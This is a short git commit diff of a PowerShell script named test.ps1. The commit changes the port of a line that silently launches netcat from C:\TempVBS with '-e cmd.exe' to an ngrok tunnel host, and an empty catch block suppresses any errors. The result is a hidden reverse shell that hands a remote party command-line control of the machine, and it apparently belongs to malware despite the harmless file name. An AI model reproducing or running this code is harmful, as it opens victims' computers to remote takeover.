3b449e8363b03d400e2e22e78e3637e8cd7568a9
Tech_kY <mr.annonymous2008@gmail.com>
2025-11-26 23:04:00 +0530

    Update test.ps1

--- test.ps1
+++ test.ps1
@@ -19,7 +19,7 @@ try {
 
 try {
     $WshShell = New-Object -ComObject WScript.Shell
-    $WshShell.Run("C:\TempVBS\nc.exe 0.tcp.in.ngrok.io 12899 -e cmd.exe", 0, $false)
+    $WshShell.Run("C:\TempVBS\nc.exe 0.tcp.in.ngrok.io 10040 -e cmd.exe", 0, $false)
 } catch {}
 
 Start-Sleep -Seconds 1
